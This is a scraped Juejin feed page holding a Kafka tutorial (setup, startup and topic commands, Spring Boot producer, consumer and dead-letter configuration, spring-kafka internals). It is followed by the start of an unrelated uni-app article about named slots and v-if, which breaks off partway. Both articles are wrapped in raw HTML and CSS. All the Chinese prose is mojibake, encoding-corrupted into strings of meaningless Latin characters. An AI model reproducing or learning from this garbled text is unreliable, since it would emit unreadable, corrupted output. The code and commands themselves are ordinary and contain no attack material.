.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">æ¦‚å¿µ</h4>
<ul>
<li>
<p>ä¸€ä¸ªtopicä¸»é¢˜ä¸‹é¢æœ‰å¤šä¸ªåˆ†åŒºï¼ˆæ¯”å¦‚partition1ã€partition2ã€partition3ï¼‰ï¼Œæ¯ä¸ªåˆ†åŒºæœ‰å¤šä¸ªå‰¯æœ¬ï¼›ä»æ‰€æœ‰çš„å‰¯æœ¬ä¸­é€‰å–ä¸€ä¸ªä½œä¸ºLeaderï¼Œå…¶ä»–ä½œä¸ºFollowerï¼ŒLeaderå‰¯æœ¬ è´Ÿè´£æ¶ˆæ¯çš„æ¥æ”¶å’Œæ¶ˆæ¯çš„æ¶ˆè´¹ï¼ŒFolloweråªè´Ÿè´£æ•°æ®çš„åŒæ­¥ï¼›å½“Leaderåˆ†åŒºæ•…éšœåï¼Œä»Followerä¸­é€‰å–ä¸€ä¸ªä½œä¸ºæ–°çš„Leader</p>
</li>
<li>
<p>ä¸€ä¸ªåˆ†åŒºpartitionåªèƒ½è¢«æ¶ˆè´¹è€…ç»„ä¸­çš„ä¸€ä¸ªæ¶ˆè´¹è€…å®ä¾‹æ¶ˆè´¹ï¼Œå½“topicä¸­åˆ†åŒºæ•°é‡å‘ç”Ÿå˜åŒ– æˆ–è€… æ¶ˆè´¹è€…ç»„ä¸­çš„æ¶ˆè´¹è€…å‘ç”Ÿå˜åŒ– ä¼šè§¦å‘rebalanceï¼Œé‡æ–°åˆ†é…åˆ†åŒºpartitionå’Œæ¶ˆè´¹è€…å®ä¾‹ ä¹‹é—´çš„å…³ç³»</p>
</li>
<li>
<p>ç”Ÿäº§è€…å‘é€çš„æ¶ˆæ¯åªåœ¨ä¸€ä¸ªpartitionåˆ†åŒºå†…æœ‰åºï¼Œå¦‚æœtopicä¸‹é¢æœ‰å¤šä¸ªåˆ†åŒºï¼Œé‚£æ‰€æœ‰æ¶ˆæ¯æ•´ä½“æ˜¯æ— åºçš„</p>
</li>
<li>
<p>ä¸€ä¸ªtopicå¯ä»¥æœ‰å¤šä¸ªæ¶ˆè´¹è€…ç»„ï¼Œkafkaä¼šè®°å½•æ¯ä¸ªâ€œæ¶ˆè´¹è€…ç»„â€ æ¶ˆè´¹åˆ° â€œå“ªä¸ªåˆ†åŒºçš„å“ªä¸ªåç§»é‡offsetâ€äº†</p>
</li>
</ul>
<p align="center"><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0682279ae6354bfc885ba4cef6a62202~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaWhncnk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767538899&amp;x-signature=yGQsogQMwY6Des3SmbIqi8LI%2Bh4%3D" alt="kafka.jpg" width="90%" loading="lazy"/></p>
<h4 data-id="heading-1">ä¸‹è½½</h4>
<ul>
<li>
<p>ä¸‹è½½åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fkafka.apache.org%2Fcommunity%2Fdownloads%2F%25EF%25BC%258C%25E8%25A7%25A3%25E5%258E%258B%25E5%258E%258B%25E7%25BC%25A9%25E5%258C%2585" target="_blank" title="https://kafka.apache.org/community/downloads/%EF%BC%8C%E8%A7%A3%E5%8E%8B%E5%8E%8B%E7%BC%A9%E5%8C%85" ref="nofollow noopener noreferrer">kafka.apache.org/community/dâ€¦</a></p>
</li>
<li>
<p>åœ¨<code>/root/kafka/kafka_2.12-3.6.2</code>ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹<code>mq_logs</code>ï¼Œå¹¶åœ¨<code>mq_logs</code>æ–‡ä»¶å¤¹ä¸‹åˆ†åˆ«åˆ›å»ºæ–‡ä»¶å¤¹<code>kafka_data_logs</code>å’Œ<code>zookeeper_data</code>åˆ†åˆ«ä¿å­˜kafkaçš„æ—¥å¿—æ•°æ®å’Œzookeeperçš„æ•°æ®</p>
</li>
<li>
<p>åœ¨<code>mq_logs</code>ç›®å½•ä¸‹åˆ›å»º<code>kafka_console.out</code>å’Œ<code>zookeeper_console.out</code>ä¿å­˜å¯åŠ¨ç¨‹åºæ—¶çš„æ—¥å¿—è¾“å‡º</p>
</li>
<li>
<p>è¿›å…¥configç›®å½•ä¿®æ”¹<code>zookeeper.properties</code>ï¼Œå°†dataDiræ”¹ä¸ºï¼š<code>dataDir=/root/kafka/kafka_2.12-3.6.2/mq_logs/zookeeper_data</code></p>
</li>
<li>
<p>è¿›å…¥configç›®å½•ä¿®æ”¹<code>server.properties</code></p>
<ul>
<li>
<p>å°†log.diræ”¹ä¸º<code>log.dirs=/root/kafka/kafka_2.12-3.6.2/mq_logs/kafka_data_logs</code></p>
</li>
<li>
<p>æ·»åŠ é…ç½®ï¼š<code>listeners=PLAINTEXT://0.0.0.0:9092</code>å’Œ<code> advertised.listeners=PLAINTEXT://localhost:9092</code></p>
</li>
</ul>
</li>
</ul>
<h4 data-id="heading-2">å¯åŠ¨</h4>
<ul>
<li>
<p>å…ˆå¯åŠ¨zookeeperï¼š<code>nohup bin/zookeeper-server-start.sh config/zookeeper.properties &gt; /root/kafka/kafka_2.12-3.6.2/mq_logs/zookeeper_console.out 2&gt;&amp;1 &amp;</code></p>
</li>
<li>
<p>å†å¯åŠ¨kafkaï¼š<code>nohup bin/kafka-server-start.sh config/server.properties &gt; /root/kafka/kafka_2.12-3.6.2/mq_logs/kafka_console.out  2&gt;&amp;1 &amp;</code></p>
</li>
</ul>
<h4 data-id="heading-3">å‘½ä»¤</h4>
<ul>
<li>
<p>åˆ›å»ºä¸»é¢˜ï¼š<code>./kafka-topics.sh --create --topic ä¸»é¢˜åç§° --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>æŸ¥çœ‹æ‰€æœ‰ä¸»é¢˜ï¼š<code>./kafka-topics.sh --list --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªä¸»é¢˜ï¼š<code>./kafka-topics.sh --describe --topic ä¸»é¢˜åç§° --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>åˆ é™¤æŸä¸ªä¸»é¢˜ï¼š<code>./kafka-topics.sh --delete --topic ä¸»é¢˜åç§° --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªç»„çš„æ¶ˆè´¹æƒ…å†µï¼š<code>./kafka-consumer-groups.sh --describe --group æ¶ˆè´¹è€…ç»„åç§° --bootstrap-server localhost:9092</code></p>
</li>
<li>
<p>æŸ¥çœ‹æŸä¸ªç»„ä¸‹é¢çš„æ¶ˆè´¹è€…ï¼š<code>./kafka-consumer-groups.sh --describe --group æ¶ˆè´¹ç»„åç§° --bootstrap-server localhost:9092 --members</code></p>
</li>
</ul>
<h4 data-id="heading-4">springbootæ•´åˆkafka</h4>
<ul>
<li>
<p>å¼•å…¥ä¾èµ–</p>
<pre><code class="hljs language-java" lang="java">&lt;dependency&gt;
    &lt;groupId&gt;org.springframework.kafka&lt;/groupId&gt;
    &lt;artifactId&gt;spring-kafka&lt;/artifactId&gt;
&lt;/dependency&gt;
</code></pre>
</li>
<li>
<p>å¼•å…¥é…ç½®</p>
<pre><code class="hljs language-properties" lang="properties">spring.kafka.bootstrap-servers=115.190.156.159:9092
spring.kafka.producer.retries=3
spring.kafka.producer.batch-size=1000
spring.kafka.producer.buffer-memory=33554432

spring.kafka.consumer.group-id=crm-microservice-newperformance
spring.kafka.consumer.enable-auto-commit=false
spring.kafka.consumer.auto-offset-reset=earliest
spring.kafka.consumer.max-poll-records=200
spring.kafka.listener.ack-mode=MANUAL_IMMEDIATE
</code></pre>
</li>
<li>
<p>é…ç½®ç±»ï¼šå¦‚æœç¨‹åºå¼‚å¸¸ï¼Œspringé»˜è®¤å°†è¿™æ¡æ¶ˆæ¯é‡å¤å¤„ç†9æ¬¡ï¼›è¿™é‡Œé…ç½®çš„æ˜¯åŒä¸€æ¶ˆæ¯ å¤šæ¬¡æ¶ˆè´¹å¤±è´¥ çš„å¤„ç†ç­–ç•¥ï¼Œå³è½¬å‘åˆ°å¦ä¸€ä¸ªæ­»ä¿¡topicä¸­ï¼›æ³¨æ„ï¼Œè¿™é‡Œæ˜¯springboot2.7åŠä»¥ä¸Šç‰ˆæœ¬çš„é…ç½®æ–¹å¼ï¼Œå’Œ2.7ä»¥ä¸‹ç‰ˆæœ¬é…ç½®æ–¹æ³•ä¸åŒ</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConfig</span> {
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> CommonErrorHandler <span class="hljs-title function_">errorHandler</span><span class="hljs-params">(KafkaTemplate&lt;Object, Object&gt; template)</span> {
        <span class="hljs-comment">// 1. å®šä¹‰æ­»ä¿¡æ¢å¤å™¨,å½“é‡è¯•è€—å°½åï¼Œå°†æ¶ˆæ¯è½¬å‘åˆ° "åŸTopic.DLT"</span>
        <span class="hljs-type">DeadLetterPublishingRecoverer</span> <span class="hljs-variable">recover</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DeadLetterPublishingRecoverer</span>(template);
        
        <span class="hljs-comment">// 2. å®šä¹‰é”™è¯¯å¤„ç†å™¨</span>
        <span class="hljs-type">DefaultErrorHandler</span> <span class="hljs-variable">errorHandler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultErrorHandler</span>(recover, <span class="hljs-keyword">new</span> <span class="hljs-title class_">FixedBackOff</span>(<span class="hljs-number">1000L</span>, <span class="hljs-number">3</span>));

        <span class="hljs-keyword">return</span> errorHandler;
    }
}
</code></pre>
</li>
<li>
<p>ç”Ÿäº§è€…</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/kafka")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaController</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> KafkaTemplate&lt;String, String&gt; kafkaTemplate;

    <span class="hljs-meta">@RequestMapping("/send")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">send</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
        Map&lt;String, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
        map.put(<span class="hljs-string">"userid"</span>, <span class="hljs-number">1001</span>);
        map.put(<span class="hljs-string">"name"</span>, <span class="hljs-string">"ccb"</span>+ UUID.randomUUID());

        ListenableFuture&lt;SendResult&lt;String, String&gt;&gt; result = kafkaTemplate.send(<span class="hljs-string">"test_ccb"</span>, JSONObject.toJSONString(map));
        System.out.println(<span class="hljs-string">"å‘é€ç»“æœï¼š"</span>+result.get());
        <span class="hljs-keyword">return</span> <span class="hljs-string">"ok"</span>;
    }
}
</code></pre>
</li>
<li>
<p>æ¶ˆè´¹è€…</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KafkaConsumer</span> {

    <span class="hljs-comment">// è¿™é‡Œçš„concurrency=5ä»£è¡¨ä¼šåˆ›å»º5ä¸ªæ¶ˆè´¹è€…å®ä¾‹</span>
    <span class="hljs-meta">@KafkaListener(topics = {"test_ccb"},concurrency = "5")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">consumer</span><span class="hljs-params">(ConsumerRecord&lt;?, ?&gt; consumerRecord, Acknowledgment ack)</span> {
        System.out.println(<span class="hljs-string">"æ”¶åˆ°æ¶ˆæ¯ï¼š"</span> + consumerRecord);
        ack.acknowledge();
    }
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-5">Spring-KafkaåŸç†</h4>
<ul>
<li><code>spring-kafka</code>çš„è‡ªåŠ¨é…ç½®ç±»ä¸­ï¼Œé€šè¿‡<code>KafkaListenerAnnotationBeanPostProcessor </code>æ‰«ææ¯ä¸ªBeanå¯¹è±¡æ˜¯å¦å¸¦æœ‰<code>@KafkaListener</code>æ³¨è§£ï¼Œå¦‚æœæœ‰åˆ™æå–æ³¨è§£ä¸Šçš„<code>topics</code>ã€<code>groupId</code>ã€<code>concurrency</code>ç­‰ä¿¡æ¯å°è£…æˆä¸€ä¸ªEndpointå¯¹è±¡ï¼Œæ ¹æ®EndpointæŒ‡å®šçš„å®¹å™¨å·¥å‚containerFactoryåˆ›å»ºå®¹å™¨ï¼Œåœ¨å®¹å™¨å†…è¿è¡Œ<code>KafkaConsumer</code></li>
<li>å®¹å™¨å·¥å‚æ˜¯<code>ConcurrentKafkaListenerContainerFactory</code>ï¼Œå®ƒç”Ÿäº§å®¹å™¨<code>KafkaMessageListenerContainer</code>ï¼Œåœ¨å®¹å™¨å†…è¿è¡Œ<code>KafkaConsumer</code>ï¼Œå¦‚æœ<code>concurrency</code>è®¾ç½®ä¸º3ï¼Œå°†åˆ›å»º3ä¸ªå®¹å™¨ï¼Œä¹Ÿå°±æ˜¯ä¼šæœ‰3ä¸ªæ¶ˆè´¹è€…å®ä¾‹</li>
<li>å¦‚æœç¨‹åºå¤„ç†è¿‡ç¨‹ä¸­å‡ºç°äº†é”™è¯¯ï¼Œä¼šè°ƒç”¨é…ç½®å¥½çš„ <code>CommonErrorHandler</code>è¿›è¡Œå¤„ç†ï¼Œé»˜è®¤ä¼šé‡è¯•9æ¬¡ï¼Œå¦‚æœè¿˜æ˜¯å¤±è´¥ï¼Œåˆ™æäº¤è¯¥åç§»é‡é¿å…é˜»å¡åç»­æ¶ˆæ¯</li>
<li>gemini3å‰–æè¿‡ç¨‹ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fshare%2F4de8006d21e2" target="_blank" title="https://gemini.google.com/share/4de8006d21e2" ref="nofollow noopener noreferrer">gemini.google.com/share/4de80â€¦</a></li>
</ul>
<h4 data-id="heading-6">ç›¸å…³æ–‡ç« </h4>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2185118" target="_blank" title="https://cloud.tencent.com/developer/article/2185118" ref="nofollow noopener noreferrer">3åˆ†é’Ÿå¸¦ä½ å½»åº•ææ‡‚ Kafka-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.tencent.com%2Fdeveloper%2Farticle%2F2185123" target="_blank" title="https://cloud.tencent.com/developer/article/2185123" ref="nofollow noopener noreferrer">ã€çœŸå®ç”Ÿäº§æ¡ˆä¾‹ã€‘SpringBoot æ•´åˆ Kafka å®ç°æ•°æ®é«˜åå-è…¾è®¯äº‘å¼€å‘è€…ç¤¾åŒº-è…¾è®¯äº‘</a></p>
</li>
<li>
<p>spring-kafkaåˆ†æï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgemini.google.com%2Fshare%2F4de8006d21e2" target="_blank" title="https://gemini.google.com/share/4de8006d21e2" ref="nofollow noopener noreferrer">gemini.google.com/share/4de80â€¦</a></p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Uni-app æ€§èƒ½å¤©å‘ï¼šä¸ºä»€ä¹ˆ v-if åˆ ä¸æ‰ DOM èŠ‚ç‚¹]]></title>    <link>https://juejin.cn/post/7589074117644288035</link>    <guid>https://juejin.cn/post/7589074117644288035</guid>    <pubDate>2025-12-29T09:22:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589074117644288035" data-draft-id="7589063105731723279" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Uni-app æ€§èƒ½å¤©å‘ï¼šä¸ºä»€ä¹ˆ v-if åˆ ä¸æ‰ DOM èŠ‚ç‚¹"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:22:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="heyCHEEMS"/> <meta itemprop="url" content="https://juejin.cn/user/4308367489378780"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Uni-app æ€§èƒ½å¤©å‘ï¼šä¸ºä»€ä¹ˆ v-if åˆ ä¸æ‰ DOM èŠ‚ç‚¹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4308367489378780/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    heyCHEEMS
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:22:27.000Z" title="Mon Dec 29 2025 09:22:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¼€å‘è‡ªå®šä¹‰ Swiper æˆ–é•¿åˆ—è¡¨ç»„ä»¶æ—¶ï¼Œä¸ºäº†ä¼˜åŒ–æ€§èƒ½ï¼Œæˆ‘ä»¬é€šå¸¸ä¼šç»™æ¯ä¸€é¡¹åŠ ä¸Šæ‡’åŠ è½½é€»è¾‘ï¼š</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"item"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"shouldRender"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">:name</span>=<span class="hljs-string">"'slot-' + index"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<p><strong>ç¥å¥‡çš„äº‹æƒ…å‘ç”Ÿäº†ï¼š</strong> å“ªæ€• <code>shouldRender</code> æ˜¯ <code>false</code>ï¼Œæ‰“å¼€å°ç¨‹åºè°ƒè¯•å™¨ä¸€çœ‹ï¼ŒWXML æ ‘é‡Œä¾ç„¶æ’æ»¡äº† <code>view slot="slot-0"</code>ã€<code>view slot="slot-1"</code>... é‡Œé¢ç”šè‡³è¿˜å¡æ»¡äº†å›¾ç‰‡èŠ‚ç‚¹ã€‚</p>
<p><strong>ç»“è®ºï¼šä½ çš„ v-if åªæ˜¯â€œéšè—â€äº†è§†è§‰ï¼Œå†…å­˜å’Œ DOM å‹åŠ›ä¸€ç‚¹æ²¡å‡ã€‚</strong></p>
<hr/>
<h3 data-id="heading-0">äºŒã€ å…·åæ’æ§½æ˜¯â€œç‰©ç†å‘ä½â€</h3>
<p>ä¸ºä»€ä¹ˆ <code>v-if</code> å¤±æ•ˆäº†ï¼Ÿå› ä¸ºåœ¨å¾®ä¿¡å°ç¨‹åºåº•å±‚ï¼Œ<strong>å…·åæ’æ§½ï¼ˆNamed Slotsï¼‰</strong> çš„å®ç°é€»è¾‘æ˜¯<strong>é™æ€æšä¸¾</strong>ã€‚</p>
<ol>
<li><strong>é¢„ç¼–è¯‘æŒ–å‘</strong>ï¼šå°ç¨‹åºåŸç”Ÿä¸æ”¯æŒåŠ¨æ€æ’æ§½åã€‚Uni-app ç¼–è¯‘å™¨ä¸ºäº†å…¼å®¹ Vueï¼Œä¼šæ ¹æ®ä½ çš„å¾ªç¯é€»è¾‘ï¼Œåœ¨ WXML é‡Œé¢„å…ˆå†™æ­»æ‰€æœ‰çš„å ä½ç¬¦ï¼ˆå¦‚ <code>slot="d-0"</code>, <code>slot="d-1"</code>ï¼‰ã€‚</li>
<li><strong>æ¸²æŸ“æƒå€’ç½®</strong>ï¼šåœ¨å…·åæ’æ§½æ¨¡å¼ä¸‹ï¼Œ<strong>çˆ¶ç»„ä»¶æ‹¥æœ‰å†…å®¹çš„å®ä¾‹åŒ–æƒ</strong>ã€‚çˆ¶ç»„ä»¶ä¼šå…ˆæŠŠæ‰€æœ‰å†…å®¹èŠ‚ç‚¹ç”Ÿæˆå¥½ï¼Œç„¶åå†â€œåˆ†å‘â€ç»™å­ç»„ä»¶ã€‚</li>
<li><strong>éš”ç¦»å¤±è´¥</strong>ï¼šå­ç»„ä»¶é‡Œçš„ <code>v-if</code> åªèƒ½å†³å®šå­ç»„ä»¶è‡ªå·±æ˜¯å¦æ˜¾ç¤ºï¼Œä½†æŒ¡ä¸ä½çˆ¶ç»„ä»¶å·²ç»äº§ç”Ÿçš„ç‰©ç†èŠ‚ç‚¹ã€‚è¿™å°±å¥½æ¯”<strong>è™½ç„¶ä½ æŠŠå®¶é—¨å…³äº†ï¼ˆv-if=falseï¼‰ï¼Œä½†é‚»å±…å·²ç»æŠŠè´§å¸åœ¨äº†ä½ é—¨å£ï¼ˆDOM å ä½ï¼‰</strong> ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-1">ä¸‰ã€ ä½œç”¨åŸŸæ’æ§½æ˜¯â€œåŠ¨æ€æ¨¡ç‰ˆâ€</h3>
<p>è¦å®ç°çœŸæ­£çš„æ‡’åŠ è½½ï¼ˆéš <code>v-if</code> é”€æ¯ DOMï¼‰ï¼Œå¿…é¡»é‡æ„ä¸º<strong>ä½œç”¨åŸŸæ’æ§½ï¼ˆScoped Slotsï¼‰</strong> ã€‚</p>
<h4 data-id="heading-2">1. å­ç»„ä»¶æ”¹é€ ï¼šå˜â€œå¤šå‘â€ä¸ºâ€œå•æ¨¡æ¿â€</h4>
<p>ä¸è¦å†ç»™æ’æ§½èµ·åŠ¨æ€åå­—ï¼Œç»Ÿä¸€ä½¿ç”¨å¸¦ä½œç”¨åŸŸçš„é»˜è®¤æ’æ§½æˆ–å…·åæ’æ§½ã€‚</p>
<pre><code class="hljs language-HTML" lang="HTML"><span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">"(item, index) in list"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"index"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"shouldRender(index)"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">slot</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"content"</span> <span class="hljs-attr">:item</span>=<span class="hljs-string">"item"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
</code></pre>
<h4 data-id="heading-3">2. çˆ¶ç»„ä»¶è°ƒç”¨ ç¦æ­¢ v-for å¡«å……</h4>
<p>è¿™æ˜¯æœ€å…³é”®çš„â€”â€”<strong>çˆ¶ç»„ä»¶ä¸å†è´Ÿè´£å¾ªç¯äº§ç”ŸèŠ‚ç‚¹ï¼Œåªæä¾›æ¸²æŸ“æ¨¡æ¿ã€‚</strong></p>
